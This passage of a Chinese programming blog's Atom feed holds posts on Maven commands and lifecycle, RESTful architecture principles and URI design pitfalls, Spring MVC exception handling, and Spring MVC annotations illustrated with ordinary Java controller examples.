install等。</li><li>site，生成站点的周期，包括生成文档和发布等。</li></ul><p>maven的生命周期是抽象的，实际需要插件来完成任务，这一过程是通过将插件的目标（goal）绑定到生命周期的具体阶段（phase）来完成的。这里就像设计模式中的模板模式，父类定义好了方法模板并规定对了执行顺序，而子类定义了每个模板方法具体要做的事情。这里的父类相当于maven，而子类就像是一个个的插件。</p><p>比如compile这个阶段，对应的是mvn complie这个命令，但是实际上是maven-compiler-plugin这个插件在起作用。</p><p>而install这个阶段,对应的mvn install命令，实际上是maven-install-plugin这个插件在起作用。</p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>在实际开发中，我们用到Maven对我们的项目进行管理的地方，就是通过在pom.xml文件中添加所需第三方jar包的坐标让maven在中央仓库中找到相应的jar包资源然后下载到本地仓库中为我们使用。有了maven以后，我们在用到第三方jar包时就不需要再去网上找相关的jar包进行下载及导入到path环境中，maven为我们的项目开发进行了很好的管理。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-maven常用构建命令-了解&quot;&gt;&lt;a href=&quot;#1-maven常用构建命令-了解&quot; class=&quot;headerlink&quot; title=&quot;1.maven常用构建命令(了解)&quot;&gt;&lt;/a&gt;1.maven常用构建命令(了解)&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mvn -v&lt;/code&gt;:查看maven的版本。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mvn compile&lt;/code&gt;:编译项目。项目经过编译后会在根目录下生成一个target包(跟src包在同一目录下)，里面保存的是编译项目时字节码文件和测试报告。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mvn test&lt;/code&gt;:测试。此命令在项目目录下&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mvn package&lt;/code&gt;:打包我们的项目。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mvn clean&lt;/code&gt;:删除上述经过编译后生成的target包。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;mvn install&lt;/code&gt;:将我们的项目打包到本地仓库中。例如将A项目用该命令打包到本地仓库后，就可以在B项目的pom.xml文件中配置A项目的坐标来让B项目引用A项目，见下文仓库的讲解。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;只有第一个命令&lt;code&gt;mvn -v&lt;/code&gt;是在根目录下执行，其他5个命令都是在我们的maven项目包下执行的。&lt;/p&gt;
&lt;p&gt;上述知识只做了解，在实际开发中基本没有用到上述命令。&lt;/p&gt;
    
    </summary>
    
    
      <category term="maven" scheme="https://aunsetre.top/tags/maven/"/>
    
  </entry>
  
  <entry>
    <title>RESTful架构详解</title>
    <link href="https://aunsetre.top/2018/04/10/RESTful%E6%9E%B6%E6%9E%84/"/>
    <id>https://aunsetre.top/2018/04/10/RESTful架构/</id>
    <published>2018-04-09T16:00:00.000Z</published>
    <updated>2018-06-11T03:57:25.604Z</updated>
    
    <content type="html"><![CDATA[<p>越来越多的人开始意识到，<strong>网站即软件</strong>，而且是一种新型的软件。</p><p>这种”互联网软件”采用客户端/服务器模式，建立在分布式体系上，通过互联网通信，具有高延时（high latency）、高并发等特点。</p><p>网站开发，完全可以采用软件开发的模式。但是传统上，软件和网络是两个不同的领域，很少有交集；软件开发主要针对单机环境，网络则主要研究系统之间的通信。互联网的兴起，使得这两个领域开始融合，<strong>现在我们必须考虑，如何开发在互联网环境中使用的软件。</strong><a id="more"></a></p><p><img src="http://www.ruanyifeng.com/blogimg/asset/201109/bg2011091202.jpg" alt="img"></p><p>RESTful架构，就是目前最流行的一种互联网软件架构。它结构清晰、符合标准、易于理解、扩展方便，所以正得到越来越多网站的采用。</p><p>但是，到底什么是RESTful架构，并不是一个容易说清楚的问题。下面，我就谈谈我理解的RESTful架构。</p><h3 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h3><p>REST这个词，是<a href="http://en.wikipedia.org/wiki/Roy_Fielding" target="_blank" rel="noopener">Roy Thomas Fielding</a>在他2000年的<a href="http://www.ics.uci.edu/~fielding/pubs/dissertation/top.htm" target="_blank" rel="noopener">博士论文</a>中提出的。</p><p><img src="http://www.ruanyifeng.com/blogimg/asset/201109/bg2011091201.jpg" alt="img"></p><p>Fielding是一个非常重要的人，他是HTTP协议（1.0版和1.1版）的主要设计者、Apache服务器软件的作者之一、Apache基金会的第一任主席。所以，他的这篇论文一经发表，就引起了关注，并且立即对互联网开发产生了深远的影响。</p><p>他这样介绍论文的写作目的：</p><blockquote><p>“本文研究计算机科学两大前沿—-软件和网络—-的交叉点。长期以来，软件研究主要关注软件设计的分类、设计方法的演化，很少客观地评估不同的设计选择对系统行为的影响。而相反地，网络研究主要关注系统之间通信行为的细节、如何改进特定通信机制的表现，常常忽视了一个事实，那就是改变应用程序的互动风格比改变互动协议，对整体表现有更大的影响。<strong>我这篇文章的写作目的，就是想在符合架构原理的前提下，理解和评估以网络为基础的应用软件的架构设计，得到一个功能强、性能好、适宜通信的架构。</strong>“</p><p>(This dissertation explores a junction on the frontiers of two research disciplines in computer science: software and networking. Software research has long been concerned with the categorization of software designs and the development of design methodologies, but has rarely been able to objectively evaluate the impact of various design choices on system behavior. Networking research, in contrast, is focused on the details of generic communication behavior between systems and improving the performance of particular communication techniques, often ignoring the fact that changing the interaction style of an application can have more impact on performance than the communication protocols used for that interaction. My work is motivated by the desire to understand and evaluate the architectural design of network-based application software through principled use of architectural constraints, thereby obtaining the functional, performance, and social properties desired of an architecture. )</p></blockquote><h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>Fielding将他对互联网软件的架构原则，定名为REST，即Representational State Transfer的缩写。我对这个词组的翻译是”表现层状态转化”。</p><p>如果一个架构符合REST原则，就称它为RESTful架构。</p><p><strong>要理解RESTful架构，最好的方法就是去理解Representational State Transfer这个词组到底是什么意思，它的每一个词代表了什么涵义。</strong>如果你把这个名称搞懂了，也就不难体会REST是一种什么样的设计。</p><h3 id="资源（Resources）"><a href="#资源（Resources）" class="headerlink" title="资源（Resources）"></a>资源（Resources）</h3><p>REST的名称”表现层状态转化”中，省略了主语。”表现层”其实指的是”资源”（Resources）的”表现层”。</p><p><strong>所谓”资源”，就是网络上的一个实体，或者说是网络上的一个具体信息。</strong>它可以是一段文本、一张图片、一首歌曲、一种服务，总之就是一个具体的实在。你可以用一个URI（统一资源定位符）指向它，每种资源对应一个特定的URI。要获取这个资源，访问它的URI就可以，因此URI就成了每一个资源的地址或独一无二的识别符。</p><p>所谓”上网”，就是与互联网上一系列的”资源”互动，调用它的URI。</p><h3 id="表现层（Representation"><a href="#表现层（Representation" class="headerlink" title="表现层（Representation"></a>表现层（Representation</h3><p>“资源”是一种信息实体，它可以有多种外在表现形式。<strong>我们把”资源”具体呈现出来的形式，叫做它的”表现层”（Representation）。</strong></p><p>比如，文本可以用txt格式表现，也可以用HTML格式、XML格式、JSON格式表现，甚至可以采用二进制格式；图片可以用JPG格式表现，也可以用PNG格式表现。</p><p>URI只代表资源的实体，不代表它的形式。严格地说，有些网址最后的”.html”后缀名是不必要的，因为这个后缀名表示格式，属于”表现层”范畴，而URI应该只代表”资源”的位置。它的具体表现形式，应该在HTTP请求的头信息中用Accept和Content-Type字段指定，这两个字段才是对”表现层”的描述。</p><h3 id="状态转化（State-Transfer）"><a href="#状态转化（State-Transfer）" class="headerlink" title="状态转化（State Transfer）"></a>状态转化（State Transfer）</h3><p>访问一个网站，就代表了客户端和服务器的一个互动过程。在这个过程中，势必涉及到数据和状态的变化。</p><p>互联网通信协议HTTP协议，是一个无状态协议。这意味着，所有的状态都保存在服务器端。因此，<strong>如果客户端想要操作服务器，必须通过某种手段，让服务器端发生”状态转化”（State Transfer）。而这种转化是建立在表现层之上的，所以就是”表现层状态转化”。</strong></p><p>客户端用到的手段，只能是HTTP协议。具体来说，就是HTTP协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。它们分别对应四种基本操作：<strong>GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资源，DELETE用来删除资源。</strong></p><h3 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h3><p>综合上面的解释，我们总结一下什么是RESTful架构：</p><p>　　（1）每一个URI代表一种资源；</p><p>　　（2）客户端和服务器之间，传递这种资源的某种表现层；</p><p>　　（3）客户端通过四个HTTP动词，对服务器端资源进行操作，实现”表现层状态转化”。</p><h3 id="误区"><a href="#误区" class="headerlink" title="误区"></a>误区</h3><p>RESTful架构有一些典型的设计误区。</p><p><strong>最常见的一种设计错误，就是URI包含动词。</strong>因为”资源”表示一种实体，所以应该是名词，URI不应该有动词，动词应该放在HTTP协议中。</p><p>举例来说，某个URI是/posts/show/1，其中show是动词，这个URI就设计错了，正确的写法应该是/posts/1，然后用GET方法表示show。</p><p>如果某些动作是HTTP动词表示不了的，你就应该把动作做成一种资源。比如网上汇款，从账户1向账户2汇款500元，错误的URI是：</p><blockquote><p>　　POST /accounts/1/transfer/500/to/2</p></blockquote><p>正确的写法是把动词transfer改成名词transaction，资源不能是动词，但是可以是一种服务：</p><blockquote><p>　　POST /transaction HTTP/1.1<br>　　Host: 127.0.0.1<br>　　from=1&amp;to=2&amp;amount=500.00</p></blockquote><p><strong>另一个设计误区，就是在URI中加入版本号</strong>：</p><blockquote><p>　　<a href="http://www.example.com/app/1.0/foo" target="_blank" rel="noopener">http://www.example.com/app/1.0/foo</a></p><p>　　<a href="http://www.example.com/app/1.1/foo" target="_blank" rel="noopener">http://www.example.com/app/1.1/foo</a></p><p>　　<a href="http://www.example.com/app/2.0/foo" target="_blank" rel="noopener">http://www.example.com/app/2.0/foo</a></p></blockquote><p>因为不同的版本，可以理解成同一种资源的不同表现形式，所以应该采用同一个URI。版本号可以在HTTP请求头信息的Accept字段中进行区分（参见<a href="http://www.informit.com/articles/article.aspx?p=1566460" target="_blank" rel="noopener">Versioning REST Services</a>）：</p><blockquote><p>　　Accept: vnd.example-com.foo+json; version=1.0</p><p>　　Accept: vnd.example-com.foo+json; version=1.1</p><p>　　Accept: vnd.example-com.foo+json; version=2.0-怕【</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;越来越多的人开始意识到，&lt;strong&gt;网站即软件&lt;/strong&gt;，而且是一种新型的软件。&lt;/p&gt;
&lt;p&gt;这种”互联网软件”采用客户端/服务器模式，建立在分布式体系上，通过互联网通信，具有高延时（high latency）、高并发等特点。&lt;/p&gt;
&lt;p&gt;网站开发，完全可以采用软件开发的模式。但是传统上，软件和网络是两个不同的领域，很少有交集；软件开发主要针对单机环境，网络则主要研究系统之间的通信。互联网的兴起，使得这两个领域开始融合，&lt;strong&gt;现在我们必须考虑，如何开发在互联网环境中使用的软件。&lt;/strong&gt;
    
    </summary>
    
      <category term="架构" scheme="https://aunsetre.top/categories/%E6%9E%B6%E6%9E%84/"/>
    
    
      <category term="RESTful" scheme="https://aunsetre.top/tags/RESTful/"/>
    
  </entry>
  
  <entry>
    <title>SpringMVC异常处理</title>
    <link href="https://aunsetre.top/2018/04/02/2018-4-2-SpringMVC%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
    <id>https://aunsetre.top/2018/04/02/2018-4-2-SpringMVC异常处理/</id>
    <published>2018-04-01T16:00:00.000Z</published>
    <updated>2018-06-11T03:53:55.020Z</updated>
    
    <content type="html"><![CDATA[<p>springmvc提供了异常处理机制，可以将指定异常映射成http状态或者对指定异常进行相应处理。主要包括以下几个注解：<br>@ResponseStatus用于添加在一个异常类上，将其映射成为特定的http状态码<br>@ExceptionHandle用于方法上，当指定异常发生是进行处理，如果用于某个controller上时，会处理该controller所有方法抛出的相应异常。<br>当@ExceptionHandle和@ControllerAdvice组合使用时，就能捕获所有的异常进行处理。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;springmvc提供了异常处理机制，可以将指定异常映射成http状态或者对指定异常进行相应处理。主要包括以下几个注解：&lt;br&gt;@ResponseStatus用于添加在一个异常类上，将其映射成为特定的http状态码&lt;br&gt;@ExceptionHandle用于方法上，当指定异
      
    
    </summary>
    
      <category term="SpingMVC" scheme="https://aunsetre.top/categories/SpingMVC/"/>
    
    
  </entry>
  
  <entry>
    <title>SpringMVC常用注解</title>
    <link href="https://aunsetre.top/2018/03/15/2018-3-15-SpringMVC%E5%B8%B8%E7%94%A8%E6%B3%A8%E8%A7%A3/"/>
    <id>https://aunsetre.top/2018/03/15/2018-3-15-SpringMVC常用注解/</id>
    <published>2018-03-14T16:00:00.000Z</published>
    <updated>2018-06-11T03:30:08.715Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Controller"><a href="#Controller" class="headerlink" title="@Controller"></a>@Controller</h2><p>用于注解控制层，@Controller 用于标记在一个类上，使用它标记的类就是一个SpringMVC Controller 对象。分发处理器将会扫描使用了该注解的类的方法，并检测该方法是否使用了@RequestMapping 注解。@Controller 只是定义了一个控制器类，而使用@RequestMapping 注解的方法才是真正处理请求的处理器。<a id="more"></a></p><h2 id="RequestMapping"><a href="#RequestMapping" class="headerlink" title="@RequestMapping"></a>@RequestMapping</h2><p>RequestMapping是一个用来处理请求地址映射的注解，可用于类或方法上。用于类上，表示类中的所有响应请求的方法都是以该地址作为父路径。</p><p> 返回值会通过视图解析器解析为实际的物理视图，对于 InternalResourceViewResolver 视图解析器，会做如下的解析：<br> 　　　　通过 prefix + returnVal + suffix 这样的方式得到实际的物理视图，然后做转发操作；</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置视图解析器：如何把 handler 方法返回值解析为实际的物理视图 --&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/templates/"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>　　RequestMapping注解有六个属性:</p><p>　　<strong>1、 value</strong></p><p>　　　　value：指定请求的实际地址；</p><p>​     <strong>2、method；</strong></p><p>　　　　method： 指定请求的method类型， GET、POST、PUT、DELETE等，下面例子的@PathVariable后面讲解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Rest 风格的 URL（以 CRUD 为例）：</span></span><br><span class="line"><span class="comment">     *         新增：/order POST</span></span><br><span class="line"><span class="comment">     *         修改：/order/1 PUT</span></span><br><span class="line"><span class="comment">     *         获取：/order/1 GET</span></span><br><span class="line"><span class="comment">     *         删除：/order/1 DELETE</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/testRestPut/&#123;id&#125;"</span>, method = RequestMethod.PUT)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testRestPut</span><span class="params">(@PathVariable <span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"testRestPut:"</span> + id);</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/testRestDelete/&#123;id&#125;"</span>, method = RequestMethod.DELETE)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testRestDelete</span><span class="params">(@PathVariable <span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"testRestDelete:"</span> + id);</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping</span>(value = <span class="string">"/testRestPost/&#123;id&#125;"</span>, method = RequestMethod.POST)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testRestPost</span><span class="params">(@PathVariable <span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"testRestPost:"</span> + id);</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/testRestGet"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testRestGet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"testRestGet"</span>);</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>　　<strong>3、consumes</strong></p><p>　　　　consumes： 指定处理请求的提交内容类型（Content-Type），例如application/json, text/html;</p><p>　　<strong>4、produces</strong></p><p>　　　　produces:    指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回；</p><p>　　<strong>5、params</strong></p><p>　　　　params： 指定request中必须包含某些参数值是，才让该方法处理。</p><p>　　<strong>6、headers</strong></p><p>　　　　headers： 指定request中必须包含某些指定的header值，才能让该方法处理请求。</p><p>　　<strong>@RequestMapping(“/helloword/?/aa”) 的 Ant 路径,匹配符：</strong><br> 　　　　?：匹配文件名的一个字符<br> 　　　　*：匹配文件名的所有字符<br>　　　　 **：匹配多层路径</p><p>　　<strong>@RequestMapping(“/testPojo”) POJO类用法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　　<span class="meta">@RequestMapping</span>(<span class="string">"/testPojo"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testPojo</span><span class="params">(User user)</span> </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"testPojo:"</span> + user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　<strong>@RequestMapping(“/testPojo”) Map用法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　　<span class="meta">@RequestMapping</span>(<span class="string">"/testMap"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testMap</span><span class="params">(Map&lt;String, Object&gt; map)</span> </span>&#123;</span><br><span class="line">    map.put(<span class="string">"names"</span>, Arrays.asList(<span class="string">"Tomcat"</span>, <span class="string">"Eclipse"</span>, <span class="string">"JavaEE"</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>@RequestMapping(“/testPojo”) ModelAndView用法：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/index"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">testModelAndView</span><span class="params">()</span> </span>&#123;</span><br><span class="line">         ModelAndView mav = <span class="keyword">new</span> ModelAndView();</span><br><span class="line">         mav.setViewName(<span class="string">"index"</span>);</span><br><span class="line">         <span class="keyword">return</span> mav;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>一般来说都用第二种</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">　　<span class="meta">@RequestMapping</span>(<span class="string">"/index"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testModelAndView</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    modelAndView.addObject(<span class="string">"author"</span>,<span class="string">"Aunsetre"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"index"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Resource和-Autowired"><a href="#Resource和-Autowired" class="headerlink" title="@Resource和@Autowired"></a>@Resource和@Autowired</h2><p>　　@Resource和@Autowired都是做bean的注入时使用，其实@Resource并不是Spring的注解，它的包是javax.annotation.Resource，需要导入，但是Spring支持该注解的注入。</p><p>　　<strong>1、共同点</strong></p><p>　　　　两者都可以写在字段和setter方法上。两者如果都写在字段上，那么就不需要再写setter方法。</p><p>　　<strong>2、不同点</strong></p><p>　　（1）@Autowired</p><p>　　　　@Autowired为Spring提供的注解，需要导入包org.springframework.beans.factory.annotation.Autowired;只按照byType注入。</p><p>　　@Autowired注解是按照类型（byType）装配依赖对象，默认情况下它要求依赖对象必须存在，如果允许null值，可以设置它的required属性为false。如果我们想使用按照名称（byName）来装配，可以结合@Qualifier注解一起使用。如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span>&#123; </span><br><span class="line">　　<span class="meta">@Autowired</span> </span><br><span class="line">　　<span class="meta">@Qualifier</span>(<span class="string">"userDao"</span>) </span><br><span class="line">　　<span class="keyword">private</span> UserDao userDao; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　（2）@Resource</p><p>　　　　@Resource默认按照ByName自动注入，由J2EE提供，需要导入包javax.annotation.Resource。@Resource有两个重要的属性：name和type，而Spring将@Resource注解的name属性解析为bean的名字，而type属性则解析为bean的类型。所以，如果使用name属性，则使用byName的自动注入策略，而使用type属性时则使用byType自动注入策略。如果既不制定name也不制定type属性，这时将通过反射机制使用byName自动注入策略。</p><p>　　注：最好是将@Resource放在setter方法上，因为这样更符合面向对象的思想，通过set、get去操作属性，而不是直接去操作属性。</p><h2 id="PathVariable"><a href="#PathVariable" class="headerlink" title="@PathVariable"></a>@PathVariable</h2><p>　　用于将请求URL中的模板变量映射到功能处理方法的参数上，即取出uri模板中的变量作为参数。如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestController</span> </span>&#123;  </span><br><span class="line">     <span class="meta">@RequestMapping</span>(value=<span class="string">"/user/&#123;userId&#125;/roles/&#123;roleId&#125;"</span>,method = RequestMethod.GET)  </span><br><span class="line">     <span class="function"><span class="keyword">public</span> String <span class="title">getLogin</span><span class="params">(@PathVariable(<span class="string">"userId"</span>)</span> String userId,  </span></span><br><span class="line"><span class="function">         @<span class="title">PathVariable</span><span class="params">(<span class="string">"roleId"</span>)</span> String roleId)</span>&#123;  </span><br><span class="line">         System.out.println(<span class="string">"User Id : "</span> + userId);  </span><br><span class="line">         System.out.println(<span class="string">"Role Id : "</span> + roleId);  </span><br><span class="line">         <span class="keyword">return</span> <span class="string">"hello"</span>;  </span><br><span class="line">     &#125;  </span><br><span class="line">     <span class="meta">@RequestMapping</span>(value=<span class="string">"/product/&#123;productId&#125;"</span>,method = RequestMethod.GET)  </span><br><span class="line">     <span class="function"><span class="keyword">public</span> String <span class="title">getProduct</span><span class="params">(@PathVariable(<span class="string">"productId"</span>)</span> String productId)</span>&#123;  </span><br><span class="line">           System.out.println(<span class="string">"Product Id : "</span> + productId);  </span><br><span class="line">           <span class="keyword">return</span> <span class="string">"hello"</span>;  </span><br><span class="line">     &#125;  </span><br><span class="line">     <span class="meta">@RequestMapping</span>(value=<span class="string">"/javabeat/&#123;regexp1:[a-z-]+&#125;"</span>,  </span><br><span class="line">           method = RequestMethod.GET)  </span><br><span class="line">     <span class="function"><span class="keyword">public</span> String <span class="title">getRegExp</span><span class="params">(@PathVariable(<span class="string">"regexp1"</span>)</span> String regexp1)</span>&#123;  </span><br><span class="line">           System.out.println(<span class="string">"URI Part 1 : "</span> + regexp1);  </span><br><span class="line">           <span class="keyword">return</span> <span class="string">"hello"</span>;  </span><br><span class="line">     &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CookieValue"><a href="#CookieValue" class="headerlink" title="@CookieValue"></a>@CookieValue</h2><p>　　作用：用来获取Cookie中的值；</p><p>　　参数： value：参数名称   required：是否必须  defaultValue：默认值</p><p>　　使用案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/testCookieValue"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testCookieValue</span><span class="params">(@CookieValue(<span class="string">"JSESSIONID"</span>)</span> String sessionId) </span>&#123;</span><br><span class="line">    System.out.println(<span class="string">"JSESSIONID = "</span> + sessionId);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RequestParam"><a href="#RequestParam" class="headerlink" title="@RequestParam"></a>@RequestParam</h2><p>　　@RequestParam用于将请求参数区数据映射到功能处理方法的参数上，用例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@RequestParam</span>("id") 带参映射</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/testRequestParam"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testRequestParam</span><span class="params">(@RequestParam(<span class="string">"id"</span>)</span> <span class="keyword">int</span> id) </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"testRequestParam  "</span> + id);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="SessionAttributes"><a href="#SessionAttributes" class="headerlink" title="@SessionAttributes"></a>@SessionAttributes</h2><p>　　@SessionAttributes即将值放到session作用域中，写在class上面。　　</p><p>　　@SessionAttributes 除了可以通过属性名指定需要放到会话中的属性外（value 属性值），</p><p><em>还可以通过模型属性的对象类型指定哪些模型属性需要放到会话中（types 属性值）,用例：</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.aunsetre.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span 